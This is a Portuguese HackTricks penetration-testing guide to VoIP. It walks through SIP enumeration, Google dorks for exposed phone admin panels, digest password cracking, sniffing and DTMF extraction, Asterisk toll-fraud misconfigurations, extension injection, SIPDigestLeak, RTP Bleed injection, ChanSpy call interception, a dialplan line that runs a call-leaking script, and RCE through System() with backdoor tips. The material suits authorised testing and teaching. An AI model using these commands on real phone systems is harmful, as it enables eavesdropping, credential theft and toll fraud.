# Pentesting VoIP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes b√°sicas sobre VoIP

Para come√ßar a aprender sobre como o VoIP funciona, verifique:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Enumera√ß√£o VoIP

### N√∫meros de telefone

Um dos primeiros passos que uma Equipe Vermelha pode fazer √© procurar n√∫meros de telefone dispon√≠veis para entrar em contato com a empresa usando ferramentas OSINT, pesquisas no Google ou raspagem das p√°ginas da web.

Depois de ter os n√∫meros de telefone, voc√™ pode usar servi√ßos online para identificar o operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber se o operador oferece servi√ßos VoIP pode ajudar a identificar se a empresa est√° usando VoIP... Al√©m disso, √© poss√≠vel que a empresa n√£o tenha contratado servi√ßos VoIP, mas esteja usando cart√µes PSTN para conectar sua pr√≥pria PBX VoIP √† rede telef√¥nica tradicional.

Coisas como respostas autom√°ticas de m√∫sica geralmente indicam que o VoIP est√° sendo usado.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informa√ß√µes de OSINT

Qualquer outra enumera√ß√£o de OSINT que ajude a identificar o software VoIP sendo usado ser√° √∫til para uma Equipe Vermelha.

### Enumera√ß√£o de Rede

* **`nmap`** √© capaz de escanear servi√ßos UDP, mas devido ao n√∫mero de servi√ßos UDP sendo escaneados, √© muito lento e pode n√£o ser muito preciso com esse tipo de servi√ßo.
* **`svmap`** do SIPVicious (`sudo apt install sipvicious`): Localizar√° servi√ßos SIP na rede indicada.
* `svmap` √© **f√°cil de bloquear** porque usa o User-Agent `friendly-scanner`, mas voc√™ pode modificar o c√≥digo em `/usr/share/sipvicious/sipvicious` e alter√°-lo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O Sipscan √© um scanner muito r√°pido para servi√ßos SIP sobre UDP, TCP ou TLS. Ele utiliza multithread e pode escanear grandes faixas de redes. Permite indicar facilmente um intervalo de portas, escanear tanto TCP quanto UDP, usar outro m√©todo (por padr√£o, usar√° OPTIONS) e especificar um User-Agent diferente (e mais).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

O Metasploit √© uma poderosa ferramenta de teste de penetra√ß√£o que permite aos hackers explorar vulnerabilidades em sistemas de rede. Ele fornece uma ampla gama de m√≥dulos e exploits que podem ser usados para comprometer sistemas VoIP. O Metasploit √© amplamente utilizado por profissionais de seguran√ßa e hackers √©ticos para testar a seguran√ßa de redes e sistemas.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumera√ß√£o Extra de Rede

O PBX tamb√©m pode estar expondo outros servi√ßos de rede, como:

* **69/UDP (TFTP)**: Atualiza√ß√µes de firmware
* **80 (HTTP) / 443 (HTTPS)**: Para gerenciar o dispositivo pela web
* **389 (LDAP)**: Alternativa para armazenar informa√ß√µes de usu√°rios
* **3306 (MySQL)**: Banco de dados MySQL
* **5038 (Manager)**: Permite usar o Asterisk em outras plataformas
* **5222 (XMPP)**: Mensagens usando Jabber
* **5432 (PostgreSQL)**: Banco de dados PostgreSQL
* E outros...

### Enumera√ß√£o de M√©todos

√â poss√≠vel descobrir **quais m√©todos est√£o dispon√≠veis** para uso no PBX usando `sipenumerate.py` do [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Enumera√ß√£o de Extens√µes

As extens√µes em um sistema PBX (Private Branch Exchange) se referem aos **identificadores internos √∫nicos atribu√≠dos a linhas telef√¥nicas, dispositivos ou usu√°rios individuais** dentro de uma organiza√ß√£o ou empresa. As extens√µes tornam poss√≠vel **encaminhar chamadas dentro da organiza√ß√£o de forma eficiente**, sem a necessidade de n√∫meros de telefone externos individuais para cada usu√°rio ou dispositivo.

* **`svwar`** do SIPVicious (`sudo apt install sipvicious`): `svwar` √© um scanner de linhas de extens√£o SIP PBX gratuito. Em conceito, funciona de forma semelhante aos wardialers tradicionais, **adivinhando uma faixa de extens√µes ou uma lista de extens√µes fornecida**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** Sipextend identifica extens√µes em um servidor SIP. Sipextend pode verificar grandes redes e faixas de porta.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Voc√™ tamb√©m pode enumerar extens√µes/nomes de usu√°rio com o metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** √© um **enumerador de for√ßa bruta de nomes de usu√°rio** do protocolo Inter Asterisk Exchange (IAX). O enumIAX pode operar em dois modos distintos; Adivinha√ß√£o Sequencial de Nomes de Usu√°rio ou Ataque de Dicion√°rio.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### For√ßa Bruta de Senha

Ao descobrir o **PBX** e alguns **ramais/nomes de usu√°rio**, uma Equipe Vermelha pode tentar **autenticar-se via m√©todo `REGISTER`** em um ramal usando um dicion√°rio de senhas comuns para for√ßar a autentica√ß√£o.

{% hint style="danger" %}
Observe que um **nome de usu√°rio** pode ser o mesmo que o ramal, mas essa pr√°tica pode variar dependendo do sistema PBX, sua configura√ß√£o e as prefer√™ncias da organiza√ß√£o...

Se o nome de usu√°rio n√£o for o mesmo que o ramal, voc√™ precisar√° **descobrir o nome de usu√°rio para for√ßar a autentica√ß√£o**.
{% endhint %}

* **`svcrack`** do SIPVicious (`sudo apt install sipvicious`): O SVCrack permite que voc√™ quebre a senha de um nome de usu√°rio/ramal espec√≠fico em um PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack √© uma ferramenta para quebrar autentica√ß√µes de digest dentro do protocolo SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Se voc√™ encontrar equipamentos de VoIP dentro de uma **rede Wi-Fi aberta**, voc√™ pode **capturar todas as informa√ß√µes**. Al√©m disso, se voc√™ estiver dentro de uma rede mais fechada (conectada via Ethernet ou Wi-Fi protegida), voc√™ pode realizar ataques de **MitM, como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre o **PBX e o gateway** para capturar as informa√ß√µes.

Entre as informa√ß√µes de rede, voc√™ pode encontrar **credenciais web** para gerenciar o equipamento, **extens√µes de usu√°rio**, **nome de usu√°rio**, **endere√ßos IP**, at√© mesmo **senhas criptografadas** e **pacotes RTP** que voc√™ pode reproduzir para **ouvir a conversa**, e muito mais.

Para obter essas informa√ß√µes, voc√™ pode usar ferramentas como Wireshark, tcpdump... mas uma **ferramenta especialmente criada para capturar conversas de VoIP √©** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Observe que se **TLS for usado na comunica√ß√£o SIP**, voc√™ n√£o poder√° ver a comunica√ß√£o SIP em texto claro.\
O mesmo acontecer√° se **SRTP** e **ZRTP** forem usados, **os pacotes RTP n√£o estar√£o em texto claro**.
{% endhint %}

#### Credenciais SIP

[Verifique este exemplo para entender melhor uma **comunica√ß√£o SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender como as **credenciais s√£o enviadas**.

* **`sipdump`** & **`sipcrack`,** parte do **sipcrack** (`apt-get install sipcrack`): Essas ferramentas podem **extrair** de um **pcap** as **autentica√ß√µes de digest** dentro do protocolo SIP e **for√ßar a quebra de senha**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** extrai dados do protocolo SIP de um arquivo PCAP.
* **SipDump** extrai autentica√ß√µes SIP Digest de um arquivo PCAP.
* **SIP Digest Crack** √© uma ferramenta para quebrar as autentica√ß√µes digest dentro do protocolo SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### C√≥digos DTMF

**N√£o apenas as credenciais SIP** podem ser encontradas no tr√°fego de rede, tamb√©m √© poss√≠vel encontrar c√≥digos DTMF que s√£o usados, por exemplo, para acessar a **caixa postal**.\
√â poss√≠vel enviar esses c√≥digos em mensagens SIP **INFO**, em **√°udio** ou dentro de pacotes **RTP**. Se os c√≥digos estiverem dentro de pacotes RTP, voc√™ pode cortar essa parte da conversa e usar a ferramenta multimo para extra√≠-los:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chamadas Gratuitas / Configura√ß√µes Incorretas de Conex√µes do Asterisk

No Asterisk, √© poss√≠vel permitir uma conex√£o **de um endere√ßo IP espec√≠fico** ou de **qualquer endere√ßo IP**:
```
host=10.10.10.10
host=dynamic
```
Se um endere√ßo IP for especificado, o host **n√£o precisar√° enviar solicita√ß√µes REGISTER** de tempos em tempos (no pacote REGISTER √© enviado o tempo de vida, geralmente 30 minutos, o que significa que em outro cen√°rio o telefone precisar√° se REGISTRAR a cada 30 minutos). No entanto, ser√° necess√°rio ter portas abertas permitindo conex√µes do servidor VoIP para receber chamadas.

Para definir usu√°rios, eles podem ser definidos como:

* **`type=user`**: O usu√°rio s√≥ pode receber chamadas como usu√°rio.
* **`type=friend`**: √â poss√≠vel realizar chamadas como peer e receb√™-las como usu√°rio (usado com extens√µes)
* **`type=peer`**: √â poss√≠vel enviar e receber chamadas como peer (SIP-trunks)

Tamb√©m √© poss√≠vel estabelecer confian√ßa com a vari√°vel insegura:

* **`insecure=port`**: Permite conex√µes peer validadas por IP.
* **`insecure=invite`**: N√£o requer autentica√ß√£o para mensagens INVITE
* **`insecure=port,invite`**: Ambos

{% hint style="warning" %}
Quando **`type=friend`** √© usado, o **valor** da vari√°vel **host** **n√£o ser√° usado**, ent√£o se um administrador **configurar incorretamente um SIP-trunk** usando esse valor, **qualquer pessoa poder√° se conectar a ele**.

Por exemplo, essa configura√ß√£o seria vulner√°vel:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Chamadas Gratuitas / Configura√ß√µes Incorretas de Contexto do Asterisk

No Asterisk, um **contexto** √© um cont√™iner ou se√ß√£o nomeado no plano de discagem que **agrupa extens√µes, a√ß√µes e regras relacionadas**. O plano de discagem √© o componente central de um sistema Asterisk, pois define **como as chamadas de entrada e sa√≠da s√£o tratadas e roteadas**. Os contextos s√£o usados para organizar o plano de discagem, gerenciar controle de acesso e fornecer separa√ß√£o entre diferentes partes do sistema.

Cada contexto √© definido no arquivo de configura√ß√£o, geralmente no arquivo **`extensions.conf`**. Os contextos s√£o indicados por colchetes, com o nome do contexto entre eles. Por exemplo:
```bash
csharpCopy code[my_context]
```
Dentro do contexto, voc√™ define extens√µes (padr√µes de n√∫meros discados) e as associa a uma s√©rie de a√ß√µes ou aplicativos. Essas a√ß√µes determinam como a chamada √© processada. Por exemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este exemplo demonstra um contexto simples chamado "meu\_contexto" com uma extens√£o "100". Quando algu√©m discar 100, a chamada ser√° atendida, uma mensagem de boas-vindas ser√° reproduzida e, em seguida, a chamada ser√° encerrada.

Este √© **outro contexto** que permite **ligar para qualquer outro n√∫mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se o administrador define o **contexto padr√£o** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Qualquer pessoa poder√° usar o **servidor para ligar para qualquer outro n√∫mero** (e o administrador do servidor pagar√° pela liga√ß√£o).
{% endhint %}

{% hint style="danger" %}
Al√©m disso, por padr√£o, o arquivo **`sip.conf`** cont√©m **`allowguest=true`**, ent√£o **qualquer** atacante sem autentica√ß√£o poder√° ligar para qualquer outro n√∫mero.
{% endhint %}

*   **`sipinvite.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O Sipinvite verifica se um servidor PBX nos permite fazer chamadas sem autentica√ß√£o. Se o servidor SIP tiver uma configura√ß√£o incorreta, ele nos permitir√° fazer chamadas para n√∫meros externos. Tamb√©m pode nos permitir transferir a chamada para um segundo n√∫mero externo.

Por exemplo, se o seu servidor Asterisk tiver uma m√° configura√ß√£o de contexto, voc√™ pode aceitar solicita√ß√µes INVITE sem autoriza√ß√£o. Nesse caso, um atacante pode fazer chamadas sem saber nenhum usu√°rio/senha.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Chamadas gratuitas / IVRS mal configurado

IVRS significa **Sistema de Resposta de Voz Interativa**, uma tecnologia de telefonia que permite aos usu√°rios interagir com um sistema informatizado por meio de comandos de voz ou teclas de toque. O IVRS √© usado para construir sistemas de **atendimento autom√°tico de chamadas** que oferecem uma variedade de funcionalidades, como fornecer informa√ß√µes, encaminhar chamadas e capturar entradas do usu√°rio.

O IVRS em sistemas VoIP geralmente consiste em:

1. **Prompts de voz**: Mensagens de √°udio pr√©-gravadas que guiam os usu√°rios pelas op√ß√µes de menu e instru√ß√µes do IVR.
2. **Sinaliza√ß√£o DTMF** (Dual-Tone Multi-Frequency): Entradas de teclas de toque geradas ao pressionar teclas no telefone, que s√£o usadas para navegar pelos menus do IVR e fornecer entrada.
3. **Roteamento de chamadas**: Direcionar chamadas para o destino apropriado, como departamentos espec√≠ficos, agentes ou ramais com base na entrada do usu√°rio.
4. **Captura de entrada do usu√°rio**: Coletar informa√ß√µes dos chamadores, como n√∫meros de conta, IDs de casos ou quaisquer outros dados relevantes.
5. **Integra√ß√£o com sistemas externos**: Conectar o sistema IVR a bancos de dados ou outros sistemas de software para acessar ou atualizar informa√ß√µes, realizar a√ß√µes ou disparar eventos.

Em um sistema VoIP Asterisk, voc√™ pode criar um IVR usando o plano de discagem (arquivo **`extensions.conf`**) e v√°rias aplica√ß√µes, como `Background()`, `Playback()`, `Read()`, e outras. Essas aplica√ß√µes ajudam a reproduzir prompts de voz, capturar a entrada do usu√°rio e controlar o fluxo da chamada.

#### Exemplo de configura√ß√£o vulner√°vel
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
O exemplo anterior √© um caso em que o usu√°rio √© solicitado a **pressionar 1 para ligar** para um departamento, **2 para ligar** para outro, ou **a extens√£o completa** se ele a souber.\
A vulnerabilidade est√° no fato de que o **comprimento da extens√£o indicada n√£o √© verificado, ent√£o um usu√°rio poderia inserir um n√∫mero completo durante o tempo limite de 5 segundos e ele ser√° chamado.**

### Inje√ß√£o de Extens√£o

Usando uma extens√£o como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Onde **`${EXTEN}`** √© a **extens√£o** que ser√° chamada, quando a **ext 101 for introduzida**, isso √© o que aconteceria:
```scss
exten => 101,1,Dial(SIP/101)
```
No entanto, se **`${EXTEN}`** permitir a introdu√ß√£o de **mais do que n√∫meros** (como em vers√µes mais antigas do Asterisk), um atacante poderia introduzir **`101&SIP123123123`** para ligar para o n√∫mero de telefone 123123123. E este seria o resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Portanto, uma chamada para a extens√£o **`101`** e **`123123123`** ser√° enviada e apenas a primeira que receber a chamada ser√° estabelecida... mas se um atacante usar uma **extens√£o que ignore qualquer correspond√™ncia** que esteja sendo feita mas n√£o exista, ele poder√° **injetar uma chamada apenas para o n√∫mero desejado**.

## SIPDigestLeak

O SIP Digest Leak √© uma vulnerabilidade que afeta um grande n√∫mero de telefones SIP, incluindo telefones IP de hardware e software, bem como adaptadores telef√¥nicos (VoIP para anal√≥gico). A vulnerabilidade permite o **vazamento da resposta de autentica√ß√£o Digest**, que √© calculada a partir da senha. Um **ataque de senha offline √© ent√£o poss√≠vel** e pode recuperar a maioria das senhas com base na resposta do desafio.

Cen√°rio de vulnerabilidade (para [**mais informa√ß√µes, consulte isso**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)):

1. Um telefone IP (v√≠tima) est√° ouvindo na porta 5060, aceitando chamadas telef√¥nicas
2. O atacante envia um INVITE para o telefone IP
3. O telefone da v√≠tima come√ßa a tocar e algu√©m atende e desliga (porque ningu√©m atende o telefone do outro lado)
4. Quando o telefone √© desligado, o **telefone da v√≠tima envia um BYE para o atacante**
5. O **atacante emite uma resposta 407** que **solicita autentica√ß√£o** e emite um desafio de autentica√ß√£o
6. O **telefone da v√≠tima fornece uma resposta ao desafio de autentica√ß√£o** em um segundo BYE
7. O **atacante pode ent√£o realizar um ataque de for√ßa bruta** na resposta do desafio em sua m√°quina local (ou rede distribu√≠da etc) e adivinhar a senha

* **sipdigestleak.py** de [**sippts**](https://github.com/Pepelux/sippts)**:** O SipDigestLeak explora essa vulnerabilidade.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite que um **usu√°rio da web** (que, por exemplo, pode estar interessado em um produto) **introduza** seu **n√∫mero de telefone** para receber uma liga√ß√£o. Em seguida, um comercial ser√° chamado e, quando ele **atender o telefone**, o usu√°rio ser√° **chamado e conectado ao agente**.

Um perfil comum do Asterisk para isso √©:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* O perfil anterior est√° permitindo **QUALQUER endere√ßo IP se conectar** (se a senha for conhecida).
* Para **organizar uma chamada**, como especificado anteriormente, **n√£o √© necess√°rio ter permiss√µes de leitura** e **apenas** a permiss√£o de **origem** em **escrita** √© necess√°ria.

Com essas permiss√µes, qualquer IP que conhe√ßa a senha poderia se conectar e extrair muitas informa√ß√µes, como:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Mais informa√ß√µes ou a√ß√µes podem ser solicitadas.**

### **Intercepta√ß√£o**

No Asterisk, √© poss√≠vel usar o comando **`ChanSpy`** indicando a(s) **extens√£o(√µes) para monitorar** (ou todas elas) para ouvir as conversas que est√£o acontecendo. Este comando precisa ser atribu√≠do a uma extens√£o.

Por exemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que se voc√™ **ligar** para a **extens√£o 333**, ela ir√° **monitorar** **`todas`** as extens√µes, **come√ßar a ouvir** sempre que uma nova conversa come√ßar (**`b`**) em modo silencioso (**`q`**) pois n√£o queremos interagir nela. Voc√™ pode ir de uma conversa para outra pressionando **`*`**, ou marcando o n√∫mero da extens√£o.

Tamb√©m √© poss√≠vel usar o **`ExtenSpy`** para monitorar apenas uma extens√£o.

Em vez de ouvir as conversas, √© poss√≠vel **grav√°-las em arquivos** usando uma extens√£o como:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

As chamadas ser√£o salvas em **`/tmp`**.

Voc√™ tamb√©m pode fazer o Asterisk **executar um script que vazar√° a chamada** quando ela for encerrada.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** √© um grande problema de seguran√ßa que afeta servidores VoIP baseados em Asterisk (publicado em 2017). A vulnerabilidade permite que o tr√°fego **RTP (Real Time Protocol)**, que transporta conversas VoIP, seja **interceptado e redirecionado por qualquer pessoa na Internet**. Isso ocorre porque o tr√°fego RTP contorna a autentica√ß√£o ao passar por firewalls NAT (Network Address Translation).

Os proxies RTP tentam resolver as **limita√ß√µes do NAT** que afetam os sistemas RTC, fazendo a media√ß√£o dos fluxos RTP entre duas ou mais partes. Quando o NAT est√° em vigor, o software do proxy RTP muitas vezes n√£o pode confiar nas informa√ß√µes de IP e porta RTP obtidas por meio de sinaliza√ß√£o (por exemplo, SIP). Portanto, v√°rios proxies RTP implementaram um mecanismo em que esse **tuplet de IP e porta √© aprendido automaticamente**. Isso √© frequentemente feito inspecionando o tr√°fego RTP de entrada e marcando o IP e a porta de origem para qualquer tr√°fego RTP de entrada como aquele que deve ser respondido. Esse mecanismo, que pode ser chamado de "modo de aprendizado", **n√£o utiliza nenhum tipo de autentica√ß√£o**. Portanto, **atacantes** podem **enviar tr√°fego RTP para o proxy RTP** e receber o tr√°fego RTP intermediado destinado ao chamador ou receptor de um fluxo RTP em andamento. Chamamos essa vulnerabilidade de RTP Bleed porque ela permite que os atacantes recebam fluxos de m√≠dia RTP destinados a usu√°rios leg√≠timos.

Outro comportamento interessante dos proxies RTP e das pilhas RTP √© que, √†s vezes, **mesmo que n√£o sejam vulner√°veis ao RTP Bleed**, eles ir√£o **aceitar, encaminhar e/ou processar pacotes RTP de qualquer origem**. Portanto, os atacantes podem enviar pacotes RTP que podem permitir que eles injetem sua pr√≥pria m√≠dia em vez da leg√≠tima. Chamamos esse ataque de inje√ß√£o RTP porque ele permite a inje√ß√£o de pacotes RTP ileg√≠timos em fluxos RTP existentes. Essa vulnerabilidade pode ser encontrada tanto em proxies RTP quanto em pontos de extremidade.

O Asterisk e o FreePBX tradicionalmente usam a configura√ß√£o **`NAT=yes`**, que permite que o tr√°fego RTP contorne a autentica√ß√£o, o que pode resultar em √°udio ausente ou unidirecional em chamadas.

Para mais informa√ß√µes, acesse [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta a vulnerabilidade RTP Bleed enviando fluxos RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** Ele detecta a vulnerabilidade de vazamento de RTP enviando fluxos de RTP.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** Explora a vulnerabilidade RTP Bleed enviando fluxos RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** Explora a vulnerabilidade RTP Bleed enviando fluxos RTP (de um arquivo de √°udio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

No Asterisk, se voc√™ de alguma forma conseguir **adicionar regras de extens√£o e recarreg√°-las** (por exemplo, comprometendo um servidor de gerenciamento web vulner√°vel), √© poss√≠vel obter RCE usando o comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Existe um comando chamado **`Shell`** que pode ser usado **em vez de `System`** para executar comandos do sistema, se necess√°rio.

{% hint style="warning" %}
Se o servidor estiver **proibindo o uso de certos caracteres** no comando **`System`** (como no Elastix), verifique se o servidor da web permite **criar arquivos de alguma forma dentro do sistema** (como no Elastix ou trixbox) e use-o para **criar um script de backdoor** e, em seguida, use **`System`** para **executar** esse **script**.
{% endhint %}

#### Arquivos locais interessantes e permiss√µes

* **`sip.conf`** -> Cont√©m a senha dos usu√°rios SIP.
* Se o servidor **Asterisk estiver sendo executado como root**, voc√™ pode comprometer o root.
* O usu√°rio root do **mysql** pode **n√£o ter senha**.
* Isso pode ser usado para criar um novo usu√°rio mysql como backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Cont√©m a senha do administrador do painel da web (FreePBX).
* **`FreePBX.conf`** -> Cont√©m a senha do usu√°rio FreePBXuser usado para acessar o banco de dados.
* Isso pode ser usado para criar um novo usu√°rio mysql como backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Cont√©m v√°rias senhas em texto claro, como a senha root do mysql, a senha IMAPd e a senha do administrador da web.
* **V√°rias pastas** pertencer√£o ao usu√°rio Asterisk comprometido (se n√£o estiver sendo executado como root). Esse usu√°rio pode ler os arquivos anteriores e tamb√©m controla a configura√ß√£o, portanto, ele pode fazer o Asterisk carregar outros bin√°rios com backdoor quando executado.

### Inje√ß√£o de RTP

√â poss√≠vel inserir um arquivo **`.wav`** em conversas usando ferramentas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

